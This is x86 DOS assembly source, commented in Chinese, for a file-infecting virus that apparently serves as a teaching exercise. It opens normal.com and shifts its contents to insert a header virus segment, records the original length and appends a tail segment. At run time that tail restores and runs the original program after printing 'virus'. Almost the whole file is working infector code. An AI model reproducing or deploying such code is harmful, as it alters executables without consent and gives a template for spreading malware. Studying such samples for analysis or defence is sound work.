org 100h
;程序从此到HdrVirusStart是复制感染部分，感染的是固定的本目录下的normal.com文件
;HdrVirusStart到HdrVirusEnd是头部的病毒部分，EndVirusStart到EndVirusEnd是尾部的病毒部分

push bp
mov bp, sp
sub sp, LocalVarSize

;    open file
mov ax, 3d02h;ah为3d表示打开文件，al=0只读方式，1=只写，2=读写方式
mov dx, FileName
int 21h
jnc Normal;如果不进位就跳转
mov ax, Fail
jmp ax
Normal:
mov [bp - pFileHd], ax; save filehandle，后面文件操作要用

;get file size
mov ax, 4202h
;从最后一个字节开始偏移
;ah=42移动指针，al=->0从开始计算偏移，1从当前位置计算偏移，2
;从尾部计算偏移，这个尾部是指向文件结束后的位置，所以如果
;cx和dx均为0，那么就是不移动，而这时ax存储了偏移量，就是文件大小
;本段代码执行完毕，ax中就是文件大小
mov cx, 0  ;offset is cx:dx
mov dx, 0 
mov bx, [bp - pFileHd]
int 21h
mov [bp - pFileSize], ax;ax中就是文件大小，ax是
;储存文件大小的地址????????????????????????????????????????

;将被感染文件增加HdrVirusSize大小，以便将原文件内容后移HdrVirusSize
mov bx, [bp - pFileHd]
mov si, HdrVirusSize;用si做计数器，循环后写si个字节，从而扩容
_loop1:
; write file 
mov cx, 1;写一个字节
mov dx, Buf
mov ah, 40h
int 21h
dec si;如果计数器不归零，则继续向尾部写一个字节
jnz _loop1

;将原文件后移HdrVirusSize

mov di, [bp - pFileSize]; set des offset;[bp - pFileSize]:文件大小
mov si, di;set src offset;si为移动的源偏移，
;指向原来的最后一个字节

dec si
mov [Count], di;di:文件大小,Count: dw 0000h
add di, HdrVirusSize;di为移动的目标偏移，
;指向扩容后末字节

dec di
mov bx, [bp - pFileHd];set file handle

_loop3:
; read from old file
mov ax, 4200h;al=0正方向开始计算偏移
mov cx, 0;offset is cx:dx
mov dx, si;并往后移动si字节,si=filesize-1
int 21h
;读一个字节

mov cx, 1
mov dx, Buf;Buf: db 0 当作字节缓存区,执行完之后buf就是normal文件的最后一个字节
mov ah, 3fh; ah=3fh表示---------读文件
int 21h

; write to end
;设定文件指针写入的偏移

mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, di;往后移动di字节,di=after_enlargedsize-1
int 21h

mov cx, 1
mov dx, Buf
mov ah, 40h;ah为40h表示------------写
int 21h

dec si
dec di
mov ax, [Count]
dec ax;相当于把[count]-1
mov [Count], ax;Count: dw ????h
jnz _loop3;count地址的数值不为零则跳转到_loop3

;将病毒写入头部
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, 0
int 21h

;将HdrVirusStart开始的HdrVirusSize字节
;的病毒头部部分写入程序开始

mov cx, HdrVirusSize;写入HdrVirusSize个字节
mov dx, HdrVirusStart;内容在HdrVirusStart
mov ah, 40h
int 21h

;填写被感染文件原始长度
;将文件指针指向变量InfectedFileSize
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0  ;offset is cx:dx
mov dx, HdrVirusSize - 2;InfectedFileSize
;在首部病毒结尾2字节处

int 21h
;写入InfectedFileSize为原文件长度

mov cx, 2
lea dx, [bp - pFileSize];参考上面的代码，这里要给地址，所以用lea
mov ah, 40h
int 21h

;将病毒写入尾部
mov ax, 4200h;al=00从头开始计算偏移
mov cx, 0;offset is cx:dx
;计算尾病毒的起始偏移，即原文件长度+头
;病毒长度（ HdrVirusSize ）
mov dx, [bp - pFileSize]
add dx, HdrVirusSize
int 21h

;写入尾病毒
mov cx, EndVirusSize
mov dx, EndVirusStart
mov ah, 40h
int 21h


;  close file
mov ah, 3eh ;close file
int 21h
jmp end;跳到结束，结束感染

Fail:
mov ax, FailToOpen
call StrLen

mov cx, ax
mov ax, FailToOpen
call DispStr

end:
add sp, LocalVarSize
pop bp
ret

HdrVirusStart: ;被拷贝到头部的病毒代码开始部分
call AA
AA: pop bp
sub bp, AA
push bp
mov dl, 8
mov ax, Msg
add ax, bp
mov cx, 5
call DispStr
pop bp
mov si, HdrVirusEnd
add si, bp 
mov di, $$
mov bx, InfectedFileSize
add bx, bp
mov cx, [bx]
mov bx, cx
add bx, HdrVirusSize
add bx, $$
jmp bx
DispStr:
  mov bp, ax      ; ES:BP = 串地址 
  mov ax, 01301h    ; AH = 13,  AL = 01h
  mov bx, 000ch   ; 页号为0(BH = 0) 黑底红字(BL = 0Ch,高亮)  
  int 10h     ; 10h 号中断
  ret
Msg: db "virus"
InfectedFileSize: dw 0x0000

HdrVirusEnd:;被拷贝到头部的病毒代码结束于此


EndVirusStart:;被拷贝到尾部的病毒代码开始部分

_loop2:
mov al, [si]
mov byte [di], al
inc si
inc di
dec cx
jnz _loop2
mov ax, $$;不能直接jmp $$因为用的是offset，而通过植入代码，offset都变了
jmp ax

EndVirusEnd:;被拷贝到尾部的病毒代码结束于此  
  
StrLen:
  mov si, ax
  mov cx, ax  
_loop:  
  mov ax, [si]
  inc si
  test ax, ax
  jnz _loop
  dec si
  sub si, cx
  mov ax, si
  ret
  
FileName: db "normal.com", 0
FailToOpen: db "fail to open", 0
Buf: db 0
Count: dw 0000h
pFileHd equ 2
pFileSize equ pFileHd + 2 
LocalVarSize equ pFileSize
HdrVirusSize equ HdrVirusEnd - HdrVirusStart
EndVirusSize equ EndVirusEnd - EndVirusStart
VirusSize equ EndVirusSize + HdrVirusSize;总病毒的大小